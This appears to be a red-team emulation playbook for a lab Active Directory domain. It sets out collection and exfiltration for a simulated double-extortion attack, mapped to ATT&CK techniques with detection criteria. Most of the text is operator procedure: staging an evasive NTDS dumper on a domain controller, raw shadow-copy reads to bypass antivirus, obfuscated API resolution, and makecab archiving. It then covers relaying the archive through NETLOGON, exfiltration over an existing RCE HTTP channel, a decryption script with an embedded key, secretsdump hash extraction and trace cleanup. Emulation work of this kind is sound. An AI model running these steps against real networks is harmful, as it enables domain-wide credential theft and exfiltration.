> Collection, Exfiltration

# Phase 4 - Collection & Exfiltration

## Overview

After establishing persistent Domain Admin C2 sessions on DC01 and a domain-user
session on WS01 in Phase 3, the attacker moves into the collection phase in
preparation for double-extortion. Using the `TESTLAB\Administrator` dnscat2 shell
on DC01, the attacker harvests credential material from the domain controller and
produces a single encrypted archive in one tool execution (Step 1). The archive is
then staged into DC01's NETLOGON share — a local write requiring no outbound
authentication from the PtH shell — and the IIS01 SYSTEM dnscat2 shell pulls it
from `\\DC01\NETLOGON\` using machine account Kerberos (Step 2). Step 2 covers
T1039 (reading the credential archive from the domain network share), T1021.002
(SMB share access), and T1041 (exfiltration via the react2shell HTTP channel).

Step 1 is the most sensitive step in the phase. `ntds.dit` access through a Volume
Shadow Copy is the canonical pre-ransomware credential harvest pattern on a Domain
Controller. T1003.003 (OS Credential Dumping: NTDS) is explicitly out of scope for
Scenario 1 but is included here as a dual-mapped row alongside T1005 because the
VSS/NTDS behavior produces a distinct credential-access detection signal independent
of the collection signal, and omitting it would make the DC compromise narrative
incomplete. `check.py` will write the T1003.003 row to `_out_of_scope.csv`.

Both steps run from DC01 and IIS01. No new payloads are required beyond
`NtdsRawDump.exe`: the exfiltration step reuses the react2shell HTTP channel
already open from Phase 2.

The DC01 PtH shell (Logon Type 3 network token) cannot authenticate outbound to
IIS01's admin share — NTLM double-hop: the session token carries no credential
material for a second hop. NETLOGON is used as a relay: DC01 writes `certstore.tmp`
locally into `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\` (no network hop
needed), and IIS01's SYSTEM shell pulls the file from `\\DC01\NETLOGON\` using
the machine account's Kerberos context.

---

## Step 1 - DC Credential Material, Archive & Encryption

### Voice Track

With Domain Admin privileges on DC01, the attacker runs `NtdsRawDump.exe` — a
single tool execution that covers the full credential harvest and archive chain.

The tool creates a Volume Shadow Copy of `C:` via WMI `Win32_ShadowCopy.Create()` —
no `vssadmin.exe` process is spawned. For each target file (`ntds.dit`, `SYSTEM`,
`SAM`, `SECURITY`), it opens the shadow path solely to obtain the NTFS cluster map
via `FSCTL_GET_RETRIEVAL_POINTERS`. No file data is read via the file handle. All
content is read by computing raw byte offsets (`LCN × BytesPerCluster`) and issuing
`ReadFile` against the volume device handle — a storage-layer I/O request that the
WdFilter.sys minifilter cannot intercept. Each file's plaintext bytes are
AES-256-CBC-encrypted in-memory (`AesCryptoServiceProvider`, random IV per call,
delegated to Windows CNG) and flushed to `C:\ProgramData\CertStore\` as opaque
`.tmp` blobs. The shadow copy is deleted via WMI immediately after collection.

After shadow cleanup, the tool builds a ZIP archive entirely in-memory using
`ZipArchive` over a `MemoryStream` — no `certstore.zip` file ever touches disk.
The in-memory ZIP buffer is AES-256-CBC-encrypted (second call, fresh random IV) and
written as a single opaque blob `certstore.tmp` to `C:\ProgramData\`. No plaintext
credential data, no readable archive, and no intermediate ZIP file ever lands on disk.

Static analysis evasion layers reduce the binary's detectability at rest: all
operational `kernel32` APIs (`CreateFile`, `DeviceIoControl`, `ReadFile`,
`SetFilePointerEx`, `GetFileSizeEx`, `CloseHandle`) are resolved at runtime via
`GetProcAddress` — only `GetModuleHandleW` and `GetProcAddress` appear in the PE
IAT. IOC strings (`Win32_ShadowCopy`, NTDS paths, output filenames, API names)
are stored as position-keyed encoded byte arrays and decoded in-memory; none appear
as UTF-16 literals in the compiled PE.

The binary is staged to DC01 from IIS01 via the `C$` admin share using the existing
react2shell upload path.

### Procedures

- ☣️ Launch the react2shell session and upload `NtdsRawDump.exe` to IIS01

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  ```
  rce > upload NtdsRawDump.b64 C:\Windows\Temp\NtdsRawDump.b64
  rce > decode C:\Windows\Temp\NtdsRawDump.b64 C:\Windows\Temp\NtdsRawDump.exe
  ```

  - ***Expected Output***

    ```text
    [*] Uploading NtdsRawDump.b64 via eval (NO spawn - STEALTH!)...
    [+] File uploaded successfully -> C:\Windows\Temp\NtdsRawDump.b64 (NO process spawn!)
    [+] File decoded successfully -> C:\Windows\Temp\NtdsRawDump.exe (NO process spawn!)
    ```

- ☣️ From the DC01 dnscat2 shell, create the staging directory and pull `NtdsRawDump.exe` from IIS01

  ```text
  C:\ProgramData> mkdir C:\ProgramData\CertStore
  C:\ProgramData> copy \\IIS01\C$\Windows\Temp\NtdsRawDump.exe C:\ProgramData\NtdsRawDump.exe
  ```

  - ***Expected Output***

    ```text
    (directory created; or "A subdirectory or file C:\ProgramData\CertStore already exists." if present from a prior run)
            1 file(s) copied.
    ```

- ☣️ Execute `NtdsRawDump.exe` — credential harvest, archive, and encryption in one invocation

  ```text
  C:\ProgramData> NtdsRawDump.exe C:\ProgramData\CertStore
  ```

  - ***Expected Output***

    ```text
    [*] Creating VSS shadow via WMI...
    [+] Device : \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>
    [+] ShadowID: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
    [*] BytesPerCluster: 4096
    [*] \Windows\NTDS\ntds.dit ... <N> bytes -> C:\ProgramData\CertStore\ntds.tmp
    [*] \Windows\System32\config\SYSTEM ... <N> bytes -> C:\ProgramData\CertStore\system.tmp
    [*] \Windows\System32\config\SAM ... <N> bytes -> C:\ProgramData\CertStore\sam.tmp
    [*] \Windows\System32\config\SECURITY ... <N> bytes -> C:\ProgramData\CertStore\security.tmp
    [*] Deleting shadow {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} ...
    [+] Done. 4/4 files collected.
    [*] Archiving + encrypting in-memory (AES-256-CBC)...
    [+] Encrypted: C:\ProgramData\certstore.tmp (<N> bytes)
    ```

- ☣️ Verify the encrypted archive and credential files are staged

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.tmp
  C:\ProgramData> dir C:\ProgramData\CertStore\*.tmp
  C:\ProgramData> powershell -NoProfile -Command "[System.IO.File]::ReadAllBytes('C:\ProgramData\certstore.tmp')[0..3] | ForEach-Object { '0x{0:X2}' -f $_ }"
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <N> certstore.tmp

     Directory of C:\ProgramData\CertStore
    <date>  <time>    <N> ntds.tmp
    <date>  <time>    <N> system.tmp
    <date>  <time>    <N> sam.tmp
    <date>  <time>    <N> security.tmp
                   4 File(s)    <total> bytes

    0x<rr>
    0x<rr>
    0x<rr>
    0x<rr>
    ```

  > **Note:** First 16 bytes are a randomly-generated AES IV — values are
  > non-deterministic across runs. No ZIP signature and no XOR pattern visible on disk.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1006 | Direct Volume Access | Windows | `NtdsRawDump.exe` spawned from `RuntimeBroker.exe` ghost (TESTLAB\Administrator, dnscat2 parent); raw device handle opened to `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>` (Sysmon Event 9 RawAccessRead on shadow volume device); no `vssadmin.exe` child process — VSS created and deleted via WMI; Sysmon Event 11: `ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp` written to `C:\ProgramData\CertStore\` with no recognizable file magic | Calibrated - Not Benign | `NtdsRawDump.exe` reads NTFS cluster data for `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` via raw `ReadFile` on the shadow volume device handle, bypassing WdFilter.sys minifilter callbacks; `FSCTL_GET_RETRIEVAL_POINTERS` called on each shadow file path only to obtain the cluster map — no file data read via the file handle | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Execution | T1047 | Windows Management Instrumentation | Windows | WMI-Activity Event 5857 on DC01: `Win32_ShadowCopy.Create()` and `Win32_ShadowCopy.Delete()` invoked by `NtdsRawDump.exe` (child of `RuntimeBroker.exe` ghost); no `vssadmin.exe` process in the shadow copy creation chain | Calibrated - Not Benign | `NtdsRawDump.exe` creates and deletes the VSS shadow copy via WMI `Win32_ShadowCopy` class methods, suppressing the canonical `vssadmin.exe` process creation signal | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | `NtdsRawDump.exe` spawned from `RuntimeBroker.exe` ghost; WMI-Activity Event 5857 for `Win32_ShadowCopy.Create()`; Sysmon Event 11: `ntds.tmp` written to `C:\ProgramData\CertStore\` — contains AES-256-CBC-encrypted ntds.dit content; no `vssadmin.exe`, `copy`, or file-path `ReadFile` on ntds.dit in the process tree | Not Calibrated - Not Benign | `NtdsRawDump.exe` collects the NTDS credential database via raw volume cluster reads from the shadow device; ntds.dit content recovered offline from `ntds.tmp` after AES-256-CBC decryption (pycryptodome) and parsed with `impacket-secretsdump` | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Collection | T1005 | Data from Local System | Windows | Sysmon Event 11 on DC01: `ntds.tmp`, `system.tmp`, `sam.tmp`, and `security.tmp` written to `C:\ProgramData\CertStore\` by `NtdsRawDump.exe` descended from `RuntimeBroker.exe` ghost | Calibrated - Not Benign | NTDS credential database and all three registry hives collected from shadow volume raw cluster reads and written as encrypted blobs to the local staging directory | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Collection | T1074.001 | Data Staged: Local Data Staging | Windows | `C:\ProgramData\CertStore\` created on DC01; encrypted credential-material files (`ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp`) accumulated before archiving; `certstore.tmp` written to `C:\ProgramData\` as the final staged artifact for exfiltration in Step 4 | Not Calibrated - Not Benign | `C:\ProgramData\CertStore\` is the attacker's local staging directory; individual `.tmp` files and the final `certstore.tmp` archive accumulate here across the tool's execution before exfil | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
| Collection | T1119 | Automated Collection | Windows | `NtdsRawDump.exe` completes WMI shadow creation, raw cluster reads for all four credential targets, per-file AES-256-CBC encryption, file writes, shadow deletion, in-memory ZipArchive, and AES-256-CBC archive encryption in a single non-interactive execution without operator intervention between steps | Calibrated - Not Benign | `NtdsRawDump.exe` automates the full DC credential harvest and archive chain — VSS creation via WMI, NTFS cluster map retrieval, raw volume reads, in-memory per-file AES-256-CBC encryption, disk writes, VSS cleanup, in-memory ZipArchive, and AES-256-CBC outer encryption — in one unattended process invocation | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Collection | T1560.002 | Archive Collected Data: Archive via Library | Windows | Sysmon Event 7 on DC01: `System.IO.Compression.dll` loaded into `NtdsRawDump.exe` running under `RuntimeBroker.exe` ghost; no `certstore.zip` Sysmon Event 11 — archive built entirely in-memory via `ZipArchive` over `MemoryStream`, no intermediate file written to disk | Calibrated - Not Benign | `ZipArchive` over `MemoryStream` called in-process within `NtdsRawDump.exe` — no child process spawned, no intermediate zip file on disk; the DLL image load into a non-PowerShell executable is the primary detection signal distinct from T1560.001 | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Collection | T1560.003 | Archive Collected Data: Archive via Custom Method | Windows | Sysmon Event 11 on DC01: `ntds.tmp`, `system.tmp`, `sam.tmp`, `security.tmp` written to `C:\ProgramData\CertStore\` with no NTDS signature or registry hive header — opaque ciphertext with random 16-byte IV prefix; `certstore.tmp` written to `C:\ProgramData\` with no ZIP magic bytes — first 16 bytes are random AES IV, remainder is AES-CBC ciphertext; no `certstore.zip` created at any point | Calibrated - Not Benign | `NtdsRawDump.exe` applies AES-256-CBC (via `AesCryptoServiceProvider`, delegated to Windows CNG) in two passes: per-file before writing each `.tmp` credential blob, and over the in-memory ZIP buffer before writing `certstore.tmp`; random IV prepended per call; no `xor` opcode loop in IL; no recognizable file-format magic on any output file | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | Static analysis of `NtdsRawDump.exe` IAT: only `GetModuleHandleW` and `GetProcAddress` present — `CreateFile`, `DeviceIoControl`, `ReadFile`, `SetFilePointerEx`, `GetFileSizeEx`, and `CloseHandle` absent from import table; Sysmon Event 7: `kernel32.dll` loaded into `NtdsRawDump.exe` with no corresponding DllImport thunks in static disassembly | Calibrated - Not Benign | All operational volume and I/O APIs resolved at runtime: `GetProcAddress` called with position-decoded name strings; `Marshal.GetDelegateForFunctionPointer` used to bind each delegate type — no `[DllImport]` stubs for operational APIs in the compiled PE | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | Static analysis of `NtdsRawDump.exe` PE: no UTF-16 string literals matching `Win32_ShadowCopy`, NTDS/hive paths, output filenames, or `kernel32.dll` export names; FLOSS / string extraction yields only encoded byte array content — IOC strings absent from binary; no single constant XOR key extractable (position-dependent formula defeats single-byte brute-force) | Calibrated - Not Benign | 30 IOC strings and the AES-256-CBC key stored as position-encoded byte arrays decoded in-memory at runtime; key formula `(BASE=0xA3 + i×STEP=0x5B) & 0xFF` — no constant byte shared across positions; AES key embedded encoded and decoded only at the moment of first use | DC01 (10.12.10.10) | TESTLAB\Administrator | [NtdsRawDump.cs](../../resources/payloads/NtdsRawDump/NtdsRawDump.cs) | -

---

## Step 1B: Alternative Step for Archive Action in Step 1 - Archive via Utility (makecab LOLBin)

### Voice Track

`makecab.exe` is a native Windows Server 2022 binary — no third-party install
required. The attacker uses it to compress all staged credential files in `CertStore\`
into a single cabinet archive. This step produces detection signals independent of
Step 1's in-process ZipFile archiving: the key signal here is process lineage —
`makecab.exe` spawning from the `RuntimeBroker.exe` ghost process. `RuntimeBroker.exe`
is a legitimate UWP broker that does not ordinarily spawn archival utilities. The
`SourceDir` and `CabinetNameTemplate` arguments pointing to `CertStore` make the
parent-child relationship unambiguous.

### Procedures

- ☣️ From the DC01 dnscat2 shell, generate a makecab directive file for the staged credential files

  ```text
  C:\ProgramData> (echo .Set CabinetNameTemplate=certstore.cab & echo .Set DiskDirectoryTemplate=C:\ProgramData & echo .Set MaxDiskSize=0 & echo .Set CompressionType=LZX & for %f in ("C:\ProgramData\CertStore\*.*") do @echo "%f") > C:\ProgramData\certstore.ddf
  ```

  - ***Expected Output***

    ```text
    (no output — directive file written silently)
    ```

- ☣️ Run makecab against the directive file

  ```text
  C:\ProgramData> makecab /f C:\ProgramData\certstore.ddf /V0
  ```

  - ***Expected Output***

    ```text
    Cabinet    : certstore.cab
    Disk       : 1
    File       : ntds.tmp
    File       : system.tmp
    File       : sam.tmp
    File       : security.tmp
    Compression: LZX
    ```

- ☣️ Confirm the archive was created

  ```text
  C:\ProgramData> dir C:\ProgramData\certstore.cab
  ```

  - ***Expected Output***

    ```text
    <date>  <time>      <size> certstore.cab
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1560.001 | Archive Collected Data: Archive via Utility | Windows | Sysmon Event 1 on DC01: `makecab.exe` spawns from `RuntimeBroker.exe` ghost (dnscat2 parent); command line shows `certstore.ddf` directive referencing `C:\ProgramData\CertStore`; Sysmon Event 11: `certstore.cab` created in `C:\ProgramData\` | Calibrated - Not Benign | `makecab.exe /f certstore.ddf` compresses the staged credential `.tmp` files in `CertStore\` into `certstore.cab`; invoked directly from within the dnscat2 ghost process — anomalous parent for a cabinet compression utility; distinct process-creation signal from the in-process ZipFile archiving in Step 1 | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -

---

## Step 2 - NETLOGON Relay & Exfiltration

### Voice Track

The DC01 dnscat2 shell cannot write directly to `\\IIS01\C$` — the network logon
token (Logon Type 3) from the PtH lateral movement carries no credential material
for a second outbound SMB hop (NTLM double-hop limitation). Instead of pushing
from DC01 to IIS01, the attacker inverts the direction: DC01 writes `certstore.tmp`
into its own SYSVOL scripts directory (`C:\Windows\SYSVOL\sysvol\testlab.local\scripts\`),
which is a local disk write requiring no outbound authentication. This path is
simultaneously the NETLOGON share (`\\DC01\NETLOGON\`), readable by all domain
computers via machine-account Kerberos.

The IIS01 SYSTEM dnscat2 shell then performs a single-hop pull: `copy
\\DC01\NETLOGON\certstore.tmp C:\inetpub\react.testlab.local\certstore.tmp`.
IIS01's machine account (`IIS01$`) authenticates to DC01 via Kerberos — the same
mechanism used in Step 2 — and places `certstore.tmp` in the react.testlab.local
web root. The attacker downloads it via react2shell's `download` command, the same
chunked HTTP mechanism used in Phase 2 for `f.elif`.

The recovered `certstore.tmp` is AES-256-CBC-decrypted on the attacker machine
(pycryptodome; AES key embedded in source; IV is the prepended first 16 bytes) to
recover the in-memory ZIP buffer, which is written to `certstore.zip` for extraction.
The archive yields the four AES-256-CBC-encrypted credential blobs; a second
decryption pass restores the plaintext `ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, and
`SECURITY.hiv` files. `impacket-secretsdump` extracts all domain credentials offline.

### Procedures

- ☣️ From the DC01 dnscat2 shell, stage `certstore.tmp` into the NETLOGON/SYSVOL scripts folder

  ```text
  C:\ProgramData> copy C:\ProgramData\certstore.tmp C:\Windows\SYSVOL\sysvol\testlab.local\scripts\certstore.tmp
  ```

  - ***Expected Output***

    ```text
            1 file(s) copied.
    ```

- ☣️ From the IIS01 SYSTEM dnscat2 shell, pull `certstore.tmp` from NETLOGON to the react web root

  ```text
  command (IIS01 SYSTEM) > shell

  C:\Windows\Temp> copy \\DC01\NETLOGON\certstore.tmp C:\inetpub\react.testlab.local\certstore.tmp
  ```

  - ***Expected Output***

    ```text
            1 file(s) copied.
    ```

- ☣️ Launch (or resume) the react2shell session and download `certstore.tmp`

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  ```
  rce > download C:\inetpub\react.testlab.local\certstore.tmp
  ```

  - ***Expected Output***

    ```text
    [*] Downloading C:\inetpub\react.testlab.local\certstore.tmp (<size> bytes) in <N> chunk(s) via eval (NO spawn - STEALTH!)...
    [*] Progress: 100/<N> chunks (<size>/<total> bytes)
    ...
    [+] File saved to: certstore.tmp (<total> bytes, NO process spawn!)
    ```

- ☣️ AES-decrypt `certstore.tmp`, extract the archive, and decrypt individual credential files

  ```bash
  pip install pycryptodome
  ```

  ```python
  from Crypto.Cipher import AES
  import os, zipfile

  KEY = bytes.fromhex('e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478')

  def aes_decrypt(path):
      data = open(path, 'rb').read()
      iv, ct = data[:16], data[16:]
      pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
      return pt[:-pt[-1]]  # PKCS7 unpad

  # Step 1 — decrypt and extract archive
  zip_data = aes_decrypt('certstore.tmp')
  open('certstore.zip', 'wb').write(zip_data)
  with zipfile.ZipFile('certstore.zip') as z:
      z.extractall('certstore/')
  os.remove('certstore.zip')

  # Step 2 — decrypt individual credential files
  for s, d in [('ntds.tmp','ntds.dit'),('system.tmp','SYSTEM.hiv'),
               ('sam.tmp','SAM.hiv'),('security.tmp','SECURITY.hiv')]:
      p = 'certstore/' + s
      if os.path.exists(p):
          open('certstore/' + d, 'wb').write(aes_decrypt(p))
          print('[+]', s, '->', d)
  ```

  - ***Expected Output***

    ```text
    [+] ntds.tmp -> ntds.dit
    [+] system.tmp -> SYSTEM.hiv
    [+] sam.tmp -> SAM.hiv
    [+] security.tmp -> SECURITY.hiv
    ```

- ☣️ Run offline credential extraction

  ```bash
  impacket-secretsdump -ntds certstore/ntds.dit -system certstore/SYSTEM.hiv -sam certstore/SAM.hiv LOCAL
  ```

  - ***Expected Output***

    ```text
    [*] Target system bootKey: 0x<syskey>
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] PEK # 0 found and decrypted: <pek>
    [*] Reading and decrypting hashes from certstore/ntds.dit
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:41c46bf74ec071f65c7b97df4b7d672a:::
    ...
    ```

- ☣️ Cleanup: delete `certstore.tmp` from NETLOGON (DC01 dnscat2 shell) and from IIS01 web root (IIS01 SYSTEM dnscat2 shell)

  ```text
  C:\ProgramData> del C:\Windows\SYSVOL\sysvol\testlab.local\scripts\certstore.tmp /f /q
  ```

  ```text
  command (IIS01 SYSTEM) > shell
  C:\Windows\Temp> del C:\inetpub\react.testlab.local\certstore.tmp /f /q
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Collection | T1039 | Data from Network Shared Drive | Windows | Security Event 5145 on DC01: `NETLOGON` share accessed by `IIS01$` machine account (Logon Type 3 from `10.12.10.20`); `certstore.tmp` — a non-script binary blob — read from the domain network share outside any user logon event; Sysmon Event 11 on IIS01: `certstore.tmp` written to `C:\inetpub\react.testlab.local\` by `cmd.exe` (dnscat2 shell child) | Calibrated - Not Benign | IIS01 SYSTEM dnscat2 shell reads `certstore.tmp` (AES-256-CBC-encrypted DC credential archive) from `\\DC01\NETLOGON\` using `IIS01$` machine account Kerberos; NETLOGON share used as relay — DC01 PtH Logon Type 3 token carries no outbound credentials for a second hop, so direction is inverted: DC01 writes locally to SYSVOL scripts, IIS01 pulls via single-hop SMB | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -
| Collection | T1074.001 | Data Staged: Local Data Staging | Windows | Sysmon Event 11 on DC01: `certstore.tmp` written to `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\` by `RuntimeBroker.exe` ghost (TESTLAB\Administrator dnscat2 parent); non-script `.tmp` binary blob in the SYSVOL scripts directory is anomalous — no logon script has this file extension; DFSR change journal records a new file in the replicated SYSVOL folder | Calibrated - Not Benign | `certstore.tmp` (AES-256-CBC-encrypted archive of all DC credential material) copied into the DC01 SYSVOL scripts directory as a staging relay point accessible to domain computers via `\\DC01\NETLOGON\`; avoids outbound SMB from DC01 — local write only | DC01 (10.12.10.10) | TESTLAB\Administrator | - | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | Security Event 4624 on DC01: `IIS01$` network logon (Logon Type 3) from `10.12.10.20`; Security Event 5145 on DC01: `NETLOGON` share accessed, `certstore.tmp` read by IIS01 machine account; Sysmon Event 11 on IIS01: `certstore.tmp` created in `C:\inetpub\react.testlab.local\` | Calibrated - Not Benign | IIS01 SYSTEM dnscat2 shell copies `\\DC01\NETLOGON\certstore.tmp` to the react.testlab.local web root using `IIS01$` machine account Kerberos over SMB; single-hop from IIS01 to DC01 — machine account Kerberos avoids the NTLM double-hop constraint of the DC01 PtH Logon Type 3 shell | IIS01 (10.12.10.20) → DC01 (10.12.10.10) | IIS01$ (SYSTEM) | - | -
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | `node.exe` on IIS01 reads `certstore.tmp` via eval-based `fs.readFileSync` and transmits its content as base64-encoded 8,192-byte chunks in successive HTTP 200 responses to the attacker; same chunked HTTP response stream as Phase 2 `f.elif` download; `certstore.tmp` size distinguishes this transfer from the ~10 s LSASS dump | Calibrated - Not Benign | react2shell `download C:\inetpub\react.testlab.local\certstore.tmp` exfiltrates the AES-256-CBC-encrypted collection archive via the existing react2shell HTTP C2 channel; identical chunked eval-based mechanism to Phase 2 `f.elif` download — new exfil artifact, same C2 channel | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py download()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
